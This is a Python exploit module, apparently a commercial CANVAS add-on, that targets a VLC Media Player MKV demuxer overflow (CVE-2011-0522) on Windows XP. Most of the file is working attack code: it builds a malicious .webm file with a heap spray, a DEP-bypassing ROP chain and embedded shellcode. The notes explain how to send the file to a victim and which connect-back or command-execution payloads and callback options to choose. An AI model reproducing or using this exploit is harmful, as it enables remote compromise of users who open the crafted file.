
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside


######################################################################################
NAME = "VLC Media Player v1.1.4-1.1.6 MKV Demuxer Clientside Overflow"
DESCRIPTION = "a file format clientside overflow in VLC Media Player v1.1.4-1.1.6"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='VideoLAN'
DOCUMENTATION["Date public"] = "2011-02-03"
DOCUMENTATION["References"] = """http://www.videolan.org/security/sa1102.html
http://osvdb.org/70698
"""
DOCUMENTATION["Repeatability"] = "Unlimited"                              
DOCUMENTATION['CVE'] = "CVE-2011-0522"
DOCUMENTATION['CVE Url'] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0522"
DOCUMENTATION['CVSS'] = '9.3'
DOCUMENTATION["Notes"] = """
This is a client-side exploit - run the module and send the created file to the target user.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "XP" ]

NOTES="""
This is a client-side exploit - so run the module and send the created file
to the target user.

WP> White Phosphorus Exploit Pack
WP> VLC Media Player v1.1.4-1.1.6 MKV Demuxer Clientside Overflow
---------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>
-F <filename>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)

Versions:
0: Windows XP DEP

Payloads:
0: IE Inject Connect Back
1: HTTPMOSDEF SSL
2: HTTPMOSDEF PLAIN
3: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_vlc_mediaplayer_mkvdemuxer/wp_vlc_mediaplayer_mkvdemuxer.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 0
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows XP DEP", (0x00000000), [WINXP]]
}


class theexploit(wp_exploit, httpclientside):
    ######################################################################################
    ## WP> Dialog Information
    ######################################################################################
    PAYLOADS=["IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Execute Command"]

    DEFAULT_PAYLOAD = 1

    def __init__(self):
        wp_exploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.targets = targets
        self.version = 0
        self.isClientD = False
        self.use_universal = True
        self.badstring = "\x00\x0a\x0d"
        self.filename= "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".webm"
        self.encode_printable = True
        self.alignstack = True
        return

    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return        

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return      

    def neededListenerTypes(self):
        # We use this function to grab different shellcode type and os types
        self.getArgs()

        return self.wp_createWin32Listener()

    def createShellcode(self):
        # We use this function to grab different shellcode type and os types
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        # If called from clientD there will be no target here
        if self.target:
            self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)
        return

    def makefile(self):
        filedata =  "\x1A\x45\xDF\xA3"
        filedata += "\x01\x00\x00\x00"
        filedata += "\x00\x00\x00\x1F"
        filedata += "\x42\x86\x81\x01"
        filedata += "\x42\xF7\x81\x01"
        filedata += "\x42\xF2\x81\x04"
        filedata += "\x42\xF3\x81\x08"
        filedata += "\x42\x82\x84\x77"
        filedata += "\x65\x62\x6D"
        filedata += "\x42\x87\x81\x02"
        filedata += "\x42\x85\x81\x02"
        filedata += "\x18\x53\x80\x67"
        filedata += "\x01\x00\x00\x00"
        filedata += "\x01\xD6\x22\xF1"
        filedata += "\x11\x4D\x9B\x74"
        filedata += "\x40\x3F"
        filedata += "\x4D\xBB\x8B"
        filedata += "\x53\xAB\x84"
        filedata += "\x15\x49\xA9\x66"
        filedata += "\x53\xAC\x81"
        filedata += "\xff"
        filedata += "\x53\xAB\x84"
        filedata += "\x16\x54\xAE\x6B"
        filedata += wp_randomstring(228)
        filedata += "\x15\x49\xA9\x66"
        filedata += "\x01\x00\x00\x00"
        filedata += "\x01\xff\xff\xff"
        
        # Using -0x68294BD
        selfPtr = 0x0505D44D
        
        filedata += pack('<L', (selfPtr - 0xB5D448)) # ptr to heap spray 
        filedata += wp_randomstring(9) # padding
        # 500000
        
        spraynslide = pack('<L', selfPtr+8)        # PTR TO SELF
        spraynslide += pack('<L', 0x6B2438EF)       # POP ECX, POP ESP
        spraynslide += pack('<L', 0x64FC2E11)       # POP ESI,EDI,EBP, RET (Sled)
        spraynslide += pack('<L', 0x64FC2F6D)       # mov ECX, [ESI] CALL EBX..
        
        depSc = pack('<L', 0x64FCE505)  # pop / pop / pop / pop / pop / ret
        depSc += pack('<L', 0x00000040) # flNewProtect
        depSc += pack('<L', 0x00001000) # dwSize
        depSc += pack('<L', 0x64FF52D4) # VP-8
        depSc += pack('<L', 0x64FCCEAE) # pop ebp / ret 
        depSc += wp_randomstring(4)     # ebp gets munged here
        depSc += pack('<L', 0x64FCB26B) # pop eax
        depSc += pack('<L', selfPtr)    # Readable
        depSc += wp_randomstring(4)     #
        depSc += pack('<L', 0x64FE628B) # xchg eax, ecx
        depSc += pack('<L', 0x64FCB26B) # pop eax / pop ebp / ret
        depSc += pack('<L', selfPtr)    # readable 
        depSc += pack('<L', 0x64FCCE98) # call [ebp+8]
        depSc += pack('<L', 0x64FDB4EC) # pushad / ret
        depSc += wp_randomstring(420)
        depSc += pack('<L', 0x6E04CDF2) # push esp / ret
        depSc += self.shellcode
        
        payload = pack('<L', 0x6EF41460)*2 # retn
        payload += depSc
        payload += wp_randomstring((3197 - len(depSc)))
        payload += wp_randomstring(((16 - len(payload)) % 16))

        sprayptr = pack('<L', selfPtr)
        while len(sprayptr) < 1024000:
            sprayptr += sprayptr        
        
        
        spray =spraynslide
        while len(spray) < 1024000:
            spray += spray
            
        # write spray ptrs            
        for j in range(10):
            filedata += sprayptr 

        # write spraynslide
        for j in range(10):
            filedata += spray        
        
        filedata += payload


        return filedata

    def run(self):
        filedata=self.makefile()
        outputfile = wp_outputpath(self.filename)
        self.log("WP> Opening %s for output"%outputfile)

        fd=file(outputfile,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('WP> Wrote to %s'%(outputfile))
        return 1

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()